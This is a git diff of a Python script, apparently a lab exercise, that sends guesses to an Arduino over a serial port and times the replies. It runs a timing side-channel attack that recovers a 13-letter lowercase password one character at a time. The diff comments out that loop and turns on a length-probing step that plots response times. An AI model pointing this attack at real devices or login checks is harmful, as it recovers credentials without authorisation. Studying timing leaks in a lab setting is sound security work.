@@ -3,13 +3,11 @@ import serial
 import string
 import time 
 import matplotlib.pyplot as plt
-# from pySerialTransfer import pySerialTransfer as txfer
 
 arduino = serial.Serial(port='/dev/ttyUSB0', baudrate=115200, timeout=0.1)
 time.sleep(5)
 
 def write_read(x): 
-	initTime = time.time()
 	arduino.write(bytes(x, 'utf-8'))
 	initTime = time.time()
 	# arduino.flush() 
@@ -19,27 +17,31 @@ def write_read(x):
 
 	endTime = time.time()
 	delta = endTime - initTime
-	return delta
+	data = arduino.readline()
+	return (data,delta)
 
-def timming_attack():
-    password = ""
-    possible_char = string.ascii_lowercase
-    for i in range(13):
-        biggest_time = 0
-        next_char = ''
-        for char in possible_char:
-            tentativa = password + char
-            tempo = write_read(tentativa + "\n")
-            if tempo > biggest_time:
-                biggest_time = tempo
-                next_char = char
-        password += next_char
-        print(f"Letra nº{i+1} que demorou mais: {next_char}")
-    return password
+# def timing_attack():
+#     password = ""
+#     possible_char = string.ascii_lowercase
+#     for i in range(13):
+#         biggest_time = 0
+#         next_char = ''
+#         for char in possible_char:
+#             tentativa = password + char
+#             tempo = write_read(tentativa + "\n")
+#             print(tempo[0])
+#             if tempo[1] > biggest_time:
+#                 biggest_time = tempo[1]
+#                 next_char = char
+#         password += next_char
+#         print(f"Letra nº{i+1} que demorou mais: {next_char}")
+#     return password
 
-password = timming_attack()
-print(f"A pass encontrada é: {password}")
+# password = timing_attack()
+# print(f"A pass encontrada é: {password}")
 
+
+# FIND LENGTH ##############################################################
 
 passwd = "a"
 strlen = []
@@ -59,7 +61,7 @@ for item in strlen:
 	numList.append(item['length'])
 	timesList.append(item['time'])
 
-""" plt.plot(numList,timesList)
+plt.plot(numList,timesList)
 plt.xlabel('Number of chars')
 plt.ylabel('Time')
-plt.show() """
+plt.show()
